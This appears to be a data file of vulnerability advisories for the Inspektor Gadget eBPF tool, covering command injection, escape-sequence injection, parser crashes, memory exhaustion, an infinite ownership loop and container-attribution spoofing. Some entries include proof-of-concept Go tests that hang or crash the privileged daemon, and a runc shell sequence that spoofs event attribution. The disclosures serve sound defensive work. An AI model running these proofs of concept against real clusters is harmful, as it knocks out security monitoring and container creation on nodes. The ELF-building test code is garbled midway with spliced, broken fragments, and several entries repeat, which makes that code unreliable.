CVE-2026-24905.description: Inspektor Gadget is a set of tools and framework for data collection and system inspection on Kubernetes clusters and Linux hosts using eBPF. The `ig` binary provides a subcommand for image building, used to generate custom gadget OCI images. A part of this functionality is implemented in the file `inspektor-gadget/cmd/common/image/build.go`. The `Makefile.build` file is the Makefile template employed during the building process. This file includes user-controlled data in an unsafe fashion, specifically some parameters are embedded without an adequate escaping in the commands inside the Makefile. Prior to version 0.48.1, this implementation is vulnerable to command injection: an attacker able to control values in the `buildOptions` structure would be able to execute arbitrary commands during the building process. An attacker able to exploit this vulnerability would be able to execute arbitrary command on the Linux host where the `ig` command is launched, if images are built with the `--local` flag or on the build container invoked by `ig`, if the `--local` flag is not provided. The `buildOptions` structure is extracted from the YAML gadget manifest passed to the `ig image build` command. Therefore, the attacker would need a way to control either the full `build.yml` file passed to the `ig image build` command, or one of its options. Typically, this could happen in a CI/CD scenario that builds untrusted gadgets to verify correctness. Version 0.51.1 fixes the issue.

CVE-2026-25996.title: Inspektor Gadget is a set of tools and framework for data collect ...
CVE-2026-25996.description: Inspektor Gadget is a set of tools and framework for data collection and system inspection on Kubernetes clusters and Linux hosts using eBPF. String fields from eBPF events in columns output mode are rendered to the terminal without any sanitization of control characters or ANSI escape sequences. Therefore, a maliciously forged – partially or completely – event payload, coming from an observed container, might inject the escape sequences into the terminal of ig operators, with various effects. The columns output mode is the default when running ig run interactively.

CVE-2026-31890.title: Inspektor Gadget is a set of tools and framework for data collect ...
CVE-2026-31890.description: Inspektor Gadget is a set of tools and framework for data collection and system inspection on Kubernetes clusters and Linux hosts using eBPF. Prior to 0.50.1, in a situation where the ring-buffer of a gadget is – incidentally or maliciously – already full, the gadget will silently drop events. The include/gadget/buffer.h file contains definitions for the Buffer API that gadgets can use to, among the other things, transfer data from eBPF programs to userspace. For hosts running a modern enough Linux kernel (>= 5.8), this transfer mechanism is based on ring-buffers. The size of the ring-buffer for the gadgets is hard-coded to 256KB. When a gadget_reserve_buf fails because of insufficient space, the gadget silently cleans up without producing an alert. The lost count reported by the eBPF operator, when using ring-buffers – the modern choice – is hardcoded to zero. The vulnerability can be used by a malicious event source (e.g. a compromised container) to cause a Denial Of Service, forcing the system to drop events coming from other containers (or the same container). This vulnerability is fixed in 0.50.1.

CVE-2026-44778.title: Inspektor Gadget is a set of tools and framework for data collect ...
CVE-2026-44778.description: Inspektor Gadget is a set of tools and framework for data collection and system inspection on Kubernetes clusters and Linux hosts using eBPF. From 0.28.0 until 0.53.1, the USDT note parser in pkg/uprobetracer/usdt.go can allow an unprivileged container to crash or exhaust the memory of the privileged Inspektor Gadget process when a custom gadget containing a SEC("usdt/...") eBPF section attaches to a crafted ELF binary. The getUsdtInfo() function reads the .note.stapsdt section without validating that DescSize is large enough for three address fields, allowing an out-of-bounds slice operation to panic, and it uses untrusted NameSize and DescSize values for allocations that can consume gigabytes of memory. The parser also invokes debug/elf without panic recovery, allowing other malformed ELF structures to terminate the process. No gadget shipped by Inspektor Gadget uses USDT probes, so only deployments using custom USDT gadgets are affected, and the demonstrated impact is denial of service rather than code execution or privilege escalation. This issue is fixed in version 0.53.1.

CVE-2026-53941.title: Inspektor Gadget is a set of tools and framework for data collect ...
CVE-2026-53941.description: Inspektor Gadget is a set of tools and framework for data collection and system inspection on Kubernetes clusters and Linux hosts using eBPF. From 0.27.0 until 0.53.1, the uprobe library resolver can allow an unprivileged container to consume excessive CPU and block other containers from starting by supplying a crafted /etc/ld.so.cache file while an uprobe-based gadget is active. The parser in pkg/uprobetracer/ldcache_parser.go trusts EntryCount enough to perform excessive iteration, computes cache1Len with overflowing uint32 arithmetic, and repeatedly calls readStringFromBytes in pkg/uprobetracer/bytes.go, where byte-by-byte immutable string concatenation produces quadratic work. While this processing occurs, pkg/container-hook holds the fanotify container-start pause, allowing a crafted cache to delay startup for roughly a minute, prevent Docker from starting other containers, and degrade monitoring. Processing caches from already-running containers can still consume CPU but does not hold the new-container startup pause, and the advisory establishes no confidentiality or integrity impact. This issue is fixed in version 0.53.1.

GHSA-2726-gm5r-r7v4.title: Unbounded owner-reference walk in Kubernetes enrichment lets a namespaced user hang the container hook and wedge container creation on a node
GHSA-2726-gm5r-r7v4.description: ## Summary Denial of service via unbounded owner-reference walk in Kubernetes enrichment. Inspektor Gadget's `WithKubernetesEnrichment` option resolves a container's controller by walking `metadata.ownerReferences` in a bare `for {}` loop with no visited set and no depth cap (`pkg/container-collection/containers.go:165`, inside `ownerReferenceEnrichment`). Kubernetes tolerates cyclic owner references, so a namespaced tenant that can create Pods and controller objects (Deployment/ReplicaSet/StatefulSet/DaemonSet/Job/CronJob/ReplicationController) in their own namespace can craft a cycle (e.g. two ReplicaSets that own each other) and cause the enricher to loop forever. ## Impact Attacker model: an authenticated, ordinary namespaced Kubernetes tenant with standard namespaced write RBAC on Pods and on at least one of the 'expected' controller kinds. No cluster-scoped permission, no gadget-specific RBAC, and no interaction with the gadget's gRPC or auth surface is required. On any cluster where Inspektor Gadget is installed via `kubectl gadget deploy` (or where a library consumer registers `WithKubernetesEnrichment`), the tenant only has to have a pod scheduled on a node — automatic given the gadget runs as a DaemonSet on every node. Reproduced consequences: - The `ownerReferenceEnrichment` goroutine spins forever, issuing on the order of ~400k apiserver GETs per second per stuck enrichment from the gadget's service account (measured: 1.3M–2.0M GETs over a 5s observation window). - Total, silent loss of runtime-security observability on the targeted node — the gadget process appears healthy but is wedged inside the enricher. Argued consequence (from source and maintainer comments at `pkg/container-hook/tracer.go:557,671,880-925`, not reproduced end-to-end): the enricher is called synchronously from the fanotify `FAN_ACCESS_PERM` callback with `defer n.pidFileDirNotify.ResponseAllow(data)` still pending, so an unterminated enrichment holds the kernel-side permission response and stalls the container runtime's pid-file read, wedging container creation on the affected node. ## Affected versions - `<= 0.56.1` — the loop is present, unmodified, at HEAD (commit `8533290016af12af0ea65a7663e8084d190a6a3b`) and was verified against the published `pkg:golang/github.com/inspektor-gadget/inspektor-gadget@v0.56.0`. The Helm chart `gadget/gadget` at `0.56.0` and the Gentoo package `app-admin/ig` at `0.54.1` ship binaries built from this module and are affected in the same way. ## Patched versions - `>= v0.56.2` — the loop was modified, in commit `8fbd113e4d6dbc989ce2523026a9f09c7ddebad4`. ## Proof of concept Reproduced with `k8s.io/client-go/dynamic/fake` against the repository's own `ownerReferenceEnrichment`, so the apiserver behaviour is client-go's, not a mock. The test is written to **fail** if the loop terminates; it passes only because the function never returns. Add `pkg/container-collection/zz_repro_test.go`: ```go package containercollection import ( 'sync/atomic' 'testing' 'time' metav1 'k8s.io/apimachinery/pkg/apis/meta/v1' 'k8s.io/apimachinery/pkg/apis/meta/v1/unstructured' 'k8s.io/apimachinery/pkg/runtime' 'k8s.io/apimachinery/pkg/runtime/schema' dynamicfake 'k8s.io/client-go/dynamic/fake' k8stesting 'k8s.io/client-go/testing' ) func obj(apiVersion, kind, ns, name string, owners ...metav1.OwnerReference) *unstructured.Unstructured { u := &unstructured.Unstructured{} u.SetAPIVersion(apiVersion); u.SetKind(kind) u.SetNamespace(ns); u.SetName(name) if len(owners) > 0 { u.SetOwnerReferences(owners) } return u } func ownerRef(kind, name string) metav1.OwnerReference { api := 'apps/v1' if kind == 'Pod' { api = 'v1' } return metav1.OwnerReference{APIVersion: api, Kind: kind, Name: name} } func TestOwnerReferenceCycle(t *testing.T) { scheme := runtime.NewScheme() gvr := map[schema.GroupVersionResource]string{ {Group: '', Version: 'v1', Resource: 'pods'}: 'PodList', {Group: 'apps', Version: 'v1', Resource: 'replicasets'}: 'ReplicaSetList', {Group: 'apps', Version: 'v1', Resource: 'deployments'}: 'DeploymentList', } // evil-pod -> rs-a -> rs-b -> rs-a ... pod := obj('v1', 'Pod', 'tenant-a', 'evil-pod', ownerRef('ReplicaSet', 'rs-a')) rsA := obj('apps/v1', 'ReplicaSet', 'tenant-a', 'rs-a', ownerRef('ReplicaSet', 'rs-b')) rsB := obj('apps/v1', 'ReplicaSet', 'tenant-a', 'rs-b', ownerRef('ReplicaSet', 'rs-a')) client := dynamicfake.NewSimpleDynamicClientWithCustomListKinds(scheme, gvr, pod, rsA, rsB) var gets int64 client.PrependReactor('get', '*', func(a k8stesting.Action) (bool, runtime.Object, error) { atomic.AddInt64(&gets, 1); return false, nil, nil }) c := &Container{} c.K8s.Namespace = 'tenant-a'; c.K8s.PodName = 'evil-pod' done := make(chan error, 1) go func() { done <- ownerReferenceEnrichment(client, c, nil) }() select { case err := <-done: t.Fatalf('returned (err=%v) after %d GETs: cycle broken', err, atomic.LoadInt64(&gets)) case <-time.After(5 * time.Second): n := atomic.LoadInt64(&gets) t.Logf('STILL RUNNING after 5s: %d apiserver GETs', n) if n < 1000 { t.Fatalf('expected unbounded GETs, got %d', n) } } } ``` Run: ``` go test ./pkg/container-collection/ -run TestOwnerReferenceCycle -v -timeout 120s -count=1 ``` Expected: `STILL RUNNING after 5s: <N> apiserver GETs`, with `N` in the millions. In production the same call site is reached automatically: `pkg/operators/kubemanager/kubemanager.go:197-206` registers `WithKubernetesEnrichment` unconditionally, `pkg/container-collection/options.go:611` calls `container.GetOwnerReference(...)` on every new container, and `pkg/container-hook/tracer.go:670` invokes the enricher chain synchronously from the fanotify `FAN_ACCESS_PERM` handler with `defer n.pidFileDirNotify.ResponseAllow(data)` still pending (`tracer.go:557-558`). ## Fix suggestion The guard belongs inside the loop at `pkg/container-collection/containers.go:165` in `ownerReferenceEnrichment`. Either a visited set keyed on `(namespace, kind, name)` or a small hard depth cap is sufficient — the legitimate chains (Pod→ReplicaSet→Deployment, Pod→Job→CronJob) are depth 3, so a cap of 8 leaves ample headroom. Separately, and worth doing independently, the enricher chain invoked from `pkg/container-hook/tracer.go:670` should run under a deadline so that any future enricher bug cannot wedge the fanotify `FAN_ACCESS_PERM` response and, through it, container creation on the node. ## References - https://github.com/inspektor-gadget/inspektor-gadget/blob/main/pkg/container-collection/containers.go#L165 — the vulnerable `for {}` in `ownerReferenceEnrichment` - https://github.com/inspektor-gadget/inspektor-gadget/blob/main/pkg/container-collection/options.go#L611 — unconditional call site inside `WithKubernetesEnrichment` - https://github.com/inspektor-gadget/inspektor-gadget/blob/main/pkg/operators/kubemanager/kubemanager.go#L197-L206 — where the enricher is registered in every `kubectl gadget deploy` - https://github.com/inspektor-gadget/inspektor-gadget/blob/main/pkg/container-hook/tracer.go#L557-L671 — synchronous invocation from the fanotify `FAN_ACCESS_PERM` callback with a deferred `ResponseAllow` - https://cwe.mitre.org/data/definitions/835.html — CWE-835: Loop with Unreachable Exit Condition ('Infinite Loop')

GHSA-46wr-66jx-fr4g.title: Memory exhaustion in privileged daemon via crafted ELF string table in container
GHSA-46wr-66jx-fr4g.description: ## Description Inspektor Gadget's privileged daemon (running as a DaemonSet on Kubernetes nodes or as `ig` on Linux hosts) parses ELF binaries from containers for symbolization and uprobe attachment. Several code paths perform unbounded memory allocations based on ELF section sizes controlled by an attacker: 1. **Symbolizer string table exhaustion**: The symbolizer calls Go's `debug/elf.Symbols()` which unconditionally loads the entire `.strtab` section into memory. A crafted ELF with a single symbol but a ~499 MB string table causes a corresponding allocation in the privileged daemon. This is triggered automatically when the daemon symbolizes stack traces from a container running the crafted binary. 2. **Uprobe/USDT attachment via cilium/ebpf**: When attaching uprobes, cilium/ebpf's `link.OpenExecutable()` loads all symbols into memory via the same `debug/elf.Symbols()` path. A crafted binary targeted by a uprobe gadget causes the same exhaustion. 3. **USDT note iteration**: The USDT parser iterates ELF notes without a cap on the number of iterations, allowing CPU exhaustion via a crafted note section with millions of entries. 4. **Debuginfod file size bypass**: Debug information files fetched via debuginfod are not checked against the existing `MaxExecutableSize` limit before parsing, allowing an oversized file to bypass the size check. ### Impact An unprivileged attacker who can run a container on a node where Inspektor Gadget is deployed can cause the privileged daemon to allocate up to ~500 MB of memory per crafted binary encountered. Repeated exploitation or multiple crafted binaries can exhaust node memory, causing the daemon to be OOM-killed or degrading node stability. This constitutes a denial-of-service from an unprivileged container against the privileged monitoring infrastructure. ### Patches Fixed by: - Replacing `debug/elf.Symbols()` with a bounded symbol iterator that reads string table entries on demand without loading the full section - Adding size caps on string table sections (256 MiB) - Resolving symbols within Inspektor Gadget and passing file offsets to cilium/ebpf, bypassing its Symbols()/DynamicSymbols() path entirely as they don't limit memory consumption - Adding a note iteration cap (10,000) to USDT parsing - Adding file size validation to the debuginfod path Available in v0.55.1 and above. ### Workarounds - Do not use uprobe/USDT gadgets - Do not use the symbolizer (stack trace symbolization) - Limit which containers are monitored (using namespace/pod selectors) - Set memory limits on the Inspektor Gadget DaemonSet to prevent node-wide impact (at the cost of the daemon being OOM-killed)

GHSA-6m8m-w75g-h8qr.title: Crafted 32-bit ELF from an unprivileged container crashes the privileged Inspektor Gadget USDT note parser
GHSA-6m8m-w75g-h8qr.description: ## Summary The USDT note parser in `pkg/uprobetracer/usdt.go` (`getUsdtInfo`) can be driven to a Go runtime panic by an unprivileged container that ships a crafted 32-bit (ELFCLASS32) ELF containing a `.note.stapsdt` note. When a USDT-based gadget attaches to a library inside the container, the privileged Inspektor Gadget process parses the attacker-supplied note and panics with an index-out-of-range error. The panic occurs on a container-attach goroutine that has no panic recovery, so it terminates the entire privileged process. This is a bypass of the fix shipped for CVE-2026-44778 (GHSA-7cfq-5mhv-jrp9): the fix added a desc-length guard sized for the parser's word size, but the address fields are still read at a fixed 8-byte width, so a 32-bit note that satisfies the guard still over-reads. ## Root Cause The parser derives `wordSize` from the ELF class (4 for ELFCLASS32, 8 for ELFCLASS64) and computes `minDescSize := 3 * wordSize`. For a 32-bit file this is 12. The bounds guard rejects a note only when `len(desc) < minDescSize`, so a note with an aligned desc length of exactly 12 passes. The address fields are then read with `elfReader.ByteOrder.Uint64(desc[:wordSize])`. On a 32-bit file this evaluates to `Uint64(desc[:4])`: a slice of length 4. `binary.LittleEndian.Uint64` (and BigEndian) begins by evaluating `_ = b[7]`, and Go performs the bounds check against the slice length (4), not the underlying array capacity (12). The result is a panic, `index out of range [7] with length 4`. The violated invariant is that a length guard sized in `wordSize` units cannot protect reads performed at a fixed 8-byte width; the guard and the read use inconsistent widths. The advisory for CVE-2026-44778 also stated that `getUsdtInfo` would be wrapped in defer/recover to contain any parser panic; that recovery was not implemented, so the panic is uncontained. ```text Affected function: getUsdtInfo Location: pkg/uprobetracer/usdt.go - usdt.go: wordSize = 4 for ELFCLASS32; minDescSize = 3 * wordSize = 12 - usdt.go: guard `if len(desc) < minDescSize` passes when len(desc) == 12 - usdt.go: elfReader.ByteOrder.Uint64(desc[:wordSize]) reads b[7] of a length-4 slice -> panic No defer/recover exists in getUsdtInfo; the only recover() in the package wraps safeelf.NewFile (the ELF header parse), not the note-parsing loop. ``` ## Impact An unprivileged tenant who can schedule a workload or place a file inside a container on a monitored node can crash the privileged Inspektor Gadget process on that node. The prerequisite is that a USDT-based gadget (an eBPF program with a `usdt/...` section) is deployed and targeting a library path that the attacker's container can supply; no gadget shipped by the project uses USDT, so this affects deployments running a custom USDT gadget. This matches the reachability precondition of the parent advisory CVE-2026-44778, which the maintainers rated Low. The demonstrated capability is availability loss: the per-node DaemonSet process terminates, dropping security monitoring on that node. Because the attach runs on container start, the attacker can restart the container to crash-loop the process and sustain the outage. Confidentiality and integrity are not affected. The attacker operates within an unprivileged container but the impact lands on the privileged host process, a change of security authority. ## Proof of Concept `Dependencies: a Go toolchain and a checkout of the repository. getUsdtInfo is unexported, so the reproduction is an in-package test.` Reproduction steps: 1. Copy the test below into `pkg/uprobetracer/zz_poc_usdt32_test.go`. 2. Run `go test ./pkg/uprobetracer/ -run TestPoCUSDT -v`. 3. Remove the file afterward. The test builds a minimal little-endian ELF with one valid `stapsdt` note (`NameSize=8`, `DescSize=12`, `Type=3`) plus a `.stapsdt.base` PROGBITS section, then calls `getUsdtInfo`. The 32-bit case panics; a byte-analogous 64-bit case (desc length 24) does not, isolating the defect to the ELFCLASS32 read-width branch. ```go package uprobetracer import ( 'encoding/binary' 'os' 'path/filepath' 'testing' ) // buildELF builds a minimal little-endian ELF (class 1 = ELFCLASS32, // class 2 = ELFCLASS64) with a .note.stapsdt section holding one valid // stapsdt note plus a .stapsdt.base PROGBITS section. descSize sets the // note desc length. func buildELF(class byte, descSize uint32) []byte { le := binary.LittleEndian is64 := class == 2 note := make([]byte, 0, 32) hdr := make([]byte, 12) le.PutUint32(hdr[0:], 8) // NameSize ('stapsdt\0') le.PutUint32(hdr[4:], descSize) // DescSize le.PutUint32(hdr[8:], 3) // Type == 3 (stapsdt) note = append(note, hdr...) note = append(note, []byte('stapsdt\x00')...) note = append(note, make([]byte, descSize)...) shstr := []byte{0} nameOff := func(s string) uint32 { off := uint32(len(shstr)) shstr = append(shstr, EI_VERSION if is64 { le.PutUint16(buf[16:], 2) le.PutUint16(buf[18:], 62) le.PutUint32(buf[20:], 1) le.PutUint64(buf[40:], uint64(shTableOff)) le.PutUint16(buf[52:], uint16(ehSize)) le.PutUint16(buf[54:], 0) le.PutUint16(buf[56:], 0) le.PutUint16(buf[58:], uint16(shEntSize)) le.PutUint16(buf[60:], 4) le.PutUint16(buf[62:], 3) } else { le.PutUint16(buf[16:], 2) le.PutUint16(buf[18:], 3) le.PutUint32(buf[20:], 1) le.PutUint32(buf[32:], shTableOff) le.PutUint16(buf[40:], uint16(ehSize)) le.PutUint16(buf[42:], 0) le.PutUint16(buf[44:], 0) le.PutUint16(buf[46:], le.PutUint64(b[32:], uint64(size)) le.PutUint32(b[40:], link) le.PutUint64(b[48:], uint64(align)) } else { le.PutUint32(b[0:], name) le.PutUint32(b[4:], typ) le.PutUint32(b[12:], addr) le.PutUint32(b[16:], off) le.PutUint32(b[20:], size) le.PutUint32(b[24:], link) le.PutUint32(b[32:], align) } } putSH(0, 0, 0, 0, 0, 0, 0, 0) putSH(1, offNote, 7 /*SHT_NOTE*/, 0, noteFileOff, uint32(len(note)), 0, 4) putSH(2, offBase, 1 /*SHT_PROGBITS*/, 0x1000, baseFileOff, 0, 0, 1) putSH(3, offShstr, 3 /*SHT_STRTAB*/, 0, shstrFileOff, uint32(len(shstr)), 0, 1) return buf } func writeELF(t *testing.T, data []byte) string { t.Helper() path := filepath.Join(t.TempDir(), 'target.elf') if err := os.WriteFile(path, data, 0o644); err != nil { t.Fatalf('write elf: %v', err) } return path } func callGetUsdtInfo(path string) (panicked bool, recovered any, retErr error) { defer func() { if r := recover(); r != nil { panicked = true recovered = r } }() _, retErr = getUsdtInfo(path, 'prov:probe') return } func TestPoCUSDT32BitPanic(t *testing.T) { path := writeELF(t, buildELF(1 /*ELFCLASS32*/, 12)) panicked, recovered, err := callGetUsdtInfo(path) if !panicked { t.Fatalf('expected panic on 32-bit stapsdt note, returned err=%v', err) } t.Logf('CONFIRMED crash: getUsdtInfo panicked: %v', recovered) } func TestPoCUSDT64BitNoPanic(t *testing.T) { path := writeELF(t, buildELF(2 /*ELFCLASS64*/, 24)) panicked, recovered, err := callGetUsdtInfo(path) if panicked { t.Fatalf('negative control unexpectedly panicked: %v', recovered) } t.Logf('negative control OK: 64-bit path returned err=%v', err) } ``` ```text === RUN TestPoCUSDT32BitPanic CONFIRMED crash: getUsdtInfo panicked: runtime error: index out of range [7] with length 4 --- PASS: TestPoCUSDT32BitPanic === RUN TestPoCUSDT64BitNoPanic negative control OK: 64-bit path returned err=malformed elf file: elf prog containing addr 1000 not found (no panic) --- PASS: TestPoCUSDT64BitNoPanic ``` ## Attack Chain 1. **Exposure:** A monitored node runs a custom USDT gadget (an eBPF program with a `usdt/...` section). On container start, the privileged process attempts to attach the USDT probe to a library inside the new container. 2. **Control:** The unprivileged container fully controls the bytes of the targeted ELF and, via its own dynamic-linker cache or an absolute attach path, which file the resolver selects. It supplies an ELFCLASS32 file with one `.note.stapsdt` note whose aligned desc length is 12. 3. **Path:** Container start publishes to subscribers, which spawns a per-subscriber goroutine (`GadgetPubSub.Publish`); the local manager's attach callback calls `AttachContainer`, then `attach`, then `attachUprobe`, and for the USDT program type calls `getUsdtInfo(attachPath, symbol)`. The file is opened through `secureopen.OpenInContainer`, which only requires a regular file inside the container rootfs and imposes no ELF-class restriction. 4. **Guard:** The desc-length guard added for CVE-2026-44778 is `len(desc) < 3*wordSize`. For a 32-bit file `wordSize` is 4, so the threshold is 12 and a desc length of exactly 12 passes. No defer/recover protects the note-parsing loop on this goroutine. 5. **Primitive:** Execution reaches `elfReader.ByteOrder.Uint64(desc[:wordSize])` = `Uint64(desc[:4])`, which reads index 7 of a length-4 slice and panics. 6. **Result:** The unrecovered panic terminates the privileged process, downing security monitoring on the node; restarting the container repeats the crash to sustain the outage. ## Bypass Evidence The canonical prior advisory is GHSA-7cfq-5mhv-jrp9 (CVE-2026-44778), covering the same file, function, and impact class. Its fix commit is present in the current release and made two code changes to the parser: a `len(desc) < 3*wordSize` desc-length guard before the address reads, and 1 MiB caps on aligned name and desc sizes. The advisory description also promised a third change, wrapping `getUsdtInfo` in defer/recover; that change was not implemented. A search for `recover()` across the package finds it only in the ELF-header helper (which wraps the header parse) and in the Go-symbol resolver, neither of which is on the USDT note-parsing path. The original vector for CVE-2026-44778 was a short desc (for example a 1-byte desc), which panicked at the slice expression on a 64-bit file. The guard blocks that case. The vector here is different in shape: an ELFCLASS32 file with an aligned desc length of 12. The guard threshold for 32-bit is `3*4 = 12`, and `12 < 12` is false, so the guard passes. The subsequent read then panics inside `Uint64`, because the read is performed at a fixed 8-byte width regardless of `wordSize`. Attempts to invalidate the finding all failed: the guard does not block a desc length of 12; `desc[:4]` is length 4 so `Uint64` reads out of range even though the backing array is larger; the ELF-header recover does not cover the note loop; the attach callback handles only returned errors, and a panic is not an error; and `secureopen` performs no ELF-class check. The behavior is consistent across every current release, so this is an incomplete fix rather than a regression. Notably, because `desc[:4]` is always length 4, any 32-bit `stapsdt` note that clears the guard triggers the read fault; the crafted note is simply the untrusted trigger for a fundamentally broken 32-bit path. ## Affected Versions - `Ecosystem: Go` - `Package: github.com/inspektor-gadget/inspektor-gadget` - `Confirmed affected range: >= 0.28.0, <= 0.56.0` - `Latest release checked: v0.56.0 (Go module proxy; matches the examined source tree)` - `Fix status: not fixed for the 32-bit read-width vector; the CVE-2026-44778 fix is present but insufficient` The vulnerable read lines are unchanged in the current release v0.56.0, and the parser package in the examined tree is identical to that release. The lower bound of 0.28.0 is taken from the parent advisory's stated introduction of USDT support; the examined checkout is shallow, so that boundary could not be independently bisected and is carried on advisory authority. The parent advisory reported a fix in an earlier release line, but that fix does not remediate this ELFCLASS32 read-width vector, so the range extends through the latest release. ## Suggested Fix Enforce that every address field is read at the parser's actual word size, not at a fixed 8-byte width: read 32-bit fields with a 4-byte reader (for example `Uint32`) on ELFCLASS32 and 8-byte fields on ELFCLASS64, or validate that `len(desc) >= 8*3` before using `Uint64`. The invariant is that the read width must never exceed the guarded desc length for the file's class. As defense in depth, and as the parent advisory originally intended, wrap `getUsdtInfo` (or the container-attach path that invokes it) in a defer/recover so that a parser panic on attacker-supplied ELF cannot terminate the privileged process. As an interim mitigation without a code change, operators can avoid deploying custom USDT gadgets on nodes that run untrusted or multi-tenant workloads, since no gadget shipped by the project uses USDT. Reported by zx (GitHub: @manus-pi).

GHSA-7v7p-7w92-5m74.title: Unprivileged runc activity can spoof fanotify container attribution
GHSA-7v7p-7w92-5m74.description: ### Impact An unprivileged local user, or an untrusted workload with access to runc/crun can spoof IG’s attribution of events to containers, potentially causing incorrect security/audit conclusions. Prerequisites: - IG fanotify mode active - The attacker can execute runc/crun on the host, directly or through a runtime binary exposed inside an untrusted workload ### Reproducible steps Create two containers in separate terminals: ``` $ docker run -ti --rm --name happy_container busybox /bin/echo Happy ``` ``` $ docker run -ti --rm --name tired_container busybox /bin/echo Tired ``` So far, the container enrichment is working correctly: ``` $ sudo ig run trace_exec RUNTIME.CONTAINERNAME COMM PID TID ARGS ERROR happy_container echo 2272475 2272475 /bin/echo Happy tired_container echo 2272503 2272503 /bin/echo Tired ``` A malicious unprivileged user runs some commands. The `runc create` commands intentionally fail (the command fails with `runc create failed`; stderr is suppressed by `&>/dev/null`); their fanotify activity is still sufficient to trigger the incorrect attribution. ``` PID_HAPPY=$(docker inspect happy_container|jq '.[0].State.Pid') PID_TIRED=$(docker inspect tired_container|jq '.[0].State.Pid') ID_HAPPY=$(docker inspect happy_container|jq -r '.[0].Id'|cut -b1-8) ID_TIRED=$(docker inspect tired_container|jq -r '.[0].Id'|cut -b1-8) DIR='/tmp/foo/$ID_HAPPY' mkdir -p '$DIR' && cd '$DIR' && rm -f pid && touch config.json runc create --bundle '$DIR' --pid-file '$DIR/pid' mycontainer &>/dev/null echo -n '$PID_TIRED' > '$DIR/pid' ; cat '$DIR/pid' > /dev/null ; cd DIR='/tmp/foo/$ID_TIRED' mkdir -p '$DIR' && cd '$DIR' && rm -f pid && touch config.json runc create --bundle '$DIR' --pid-file '$DIR/pid' mycontainer &>/dev/null echo -n '$PID_HAPPY' > '$DIR/pid' ; cat '$DIR/pid' > /dev/null ; cd ``` Now, ig reports the wrong container for the commands: ``` RUNTIME.CONTAINERNAME COMM PID TID ARGS ERROR tired_container echo 2275258 2275258 /bin/echo Happy happy_container echo 2275265 2275265 /bin/echo Tired ``` ### Patches v0.55.1 and above ### Workarounds - Use NRI instead of fanotify. However, it requires https://github.com/inspektor-gadget/inspektor-gadget/pull/5688 which is not merged yet. Only possible with a container manager with NRI enabled, such as containerd 2. - Don't expose runc/crun binaries to untrusted workloads or untrusted local users and don't make them available as bind mounts in containers. ### References - Moving away from fanotify: https://github.com/inspektor-gadget/inspektor-gadget/pull/5688 - Unrelated recent fixes in fanotify code: https://github.com/inspektor-gadget/inspektor-gadget/pull/5730

CVE-2026-24905.title: Inspektor Gadget is a set of tools and framework for data collect ...
CVE-2026-24905.description: Inspektor Gadget is a set of tools and framework for data collection and system inspection on Kubernetes clusters and Linux hosts using eBPF. The `ig` binary provides a subcommand for image building, used to generate custom gadget OCI images. A part of this functionality is implemented in the file `inspektor-gadget/cmd/common/image/build.go`. The `Makefile.build` file is the Makefile template employed during the building process. This file includes user-controlled data in an unsafe fashion, specifically some parameters are embedded without an adequate escaping in the commands inside the Makefile. Prior to version 0.48.1, this implementation is vulnerable to command injection: an attacker able to control values in the `buildOptions` structure would be able to execute arbitrary commands during the building process. An attacker able to exploit this vulnerability would be able to execute arbitrary command on the Linux host where the `ig` command is launched, if images are built with the `--local` flag or on the build container invoked by `ig`, if the `--local` flag is not provided. The `buildOptions` structure is extracted from the YAML gadget manifest passed to the `ig image build` command. Therefore, the attacker would need a way to control either the full `build.yml` file passed to the `ig image build` command, or one of its options. Typically, this could happen in a CI/CD scenario that builds untrusted gadgets to verify correctness. Version 0.51.1 fixes the issue.

CVE-2026-25996.title: Inspektor Gadget is a set of tools and framework for data collect ...
CVE-2026-25996.description: Inspektor Gadget is a set of tools and framework for data collection and system inspection on Kubernetes clusters and Linux hosts using eBPF. String fields from eBPF events in columns output mode are rendered to the terminal without any sanitization of control characters or ANSI escape sequences. Therefore, a maliciously forged – partially or completely – event payload, coming from an observed container, might inject the escape sequences into the terminal of ig operators, with various effects. The columns output mode is the default when running ig run interactively.

CVE-2026-31890.title: Inspektor Gadget is a set of tools and framework for data collect ...
CVE-2026-31890.description: Inspektor Gadget is a set of tools and framework for data collection and system inspection on Kubernetes clusters and Linux hosts using eBPF. Prior to 0.50.1, in a situation where the ring-buffer of a gadget is – incidentally or maliciously – already full, the gadget will silently drop events. The include/gadget/buffer.h file contains definitions for the Buffer API that gadgets can use to, among the other things, transfer data from eBPF programs to userspace. For hosts running a modern enough Linux kernel (>= 5.8), this transfer mechanism is based on ring-buffers. The size of the ring-buffer for the gadgets is hard-coded to 256KB. When a gadget_reserve_buf fails because of insufficient space, the gadget silently cleans up without producing an alert. The lost count reported by the eBPF operator, when using ring-buffers – the modern choice – is hardcoded to zero. The vulnerability can be used by a malicious event source (e.g. a compromised container) to cause a Denial Of Service, forcing the system to drop events coming from other containers (or the same container). This vulnerability is fixed in 0.50.1.

CVE-2026-44778.title: Inspektor Gadget is a set of tools and framework for data collect ...
CVE-2026-44778.description: Inspektor Gadget is a set of tools and framework for data collection and system inspection on Kubernetes clusters and Linux hosts using eBPF. From 0.28.0 until 0.53.1, the USDT note parser in pkg/uprobetracer/usdt.go can allow an unprivileged container to crash or exhaust the memory of the privileged Inspektor Gadget process when a custom gadget containing a SEC("usdt/...") eBPF section attaches to a crafted ELF binary. The getUsdtInfo() function reads the .note.stapsdt section without validating that DescSize is large enough for three address fields, allowing an out-of-bounds slice operation to panic, and it uses untrusted NameSize and DescSize values for allocations that can consume gigabytes of memory. The parser also invokes debug/elf without panic recovery, allowing other malformed ELF structures to terminate the process. No gadget shipped by Inspektor Gadget uses USDT probes, so only deployments using custom USDT gadgets are affected, and the demonstrated impact is denial of service rather than code execution or privilege escalation. This issue is fixed in version 0.53.1.

CVE-2026-53941.title: Inspektor Gadget is a set of tools and framework for data collect ...
